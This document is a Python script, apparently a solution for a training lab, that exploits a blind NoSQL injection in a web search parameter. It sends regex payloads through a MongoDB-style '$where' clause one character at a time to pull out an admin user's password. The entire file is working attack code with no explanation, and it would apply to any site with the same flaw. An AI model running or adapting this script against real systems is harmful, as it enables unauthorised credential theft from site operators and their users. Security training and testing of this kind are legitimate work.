#!/usr/bin/env python3

import requests, sys

url = "https://ptl-c4c2c5f9-6de84251.libcurl.so/?search=admin%27%20%26%26%20this.password%20%26%26%20this.password.match"
injection1 = "(/^"
injection2 = "$/)%00"
wildcard = ".*"

alphabet = ['a', 'b', 'c', 'd', 'e', 'f', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '-']

valid = '>admin<'

password = ""
password_not_found = True

while password_not_found:
    for letter in alphabet:
        injection_string = url + injection1 + letter + wildcard + injection2
        r = requests.get(injection_string)
        if valid in r.text:
            password += letter
            new_injection_string = url + injection1 + letter + injection2
            check_final = requests.get(new_injection_string)
            if valid in check_final.text:
                password_not_found = False
                print(f"The final password is {password}")
                sys.exit()
            else:
                print(password)
                injection1 += letter


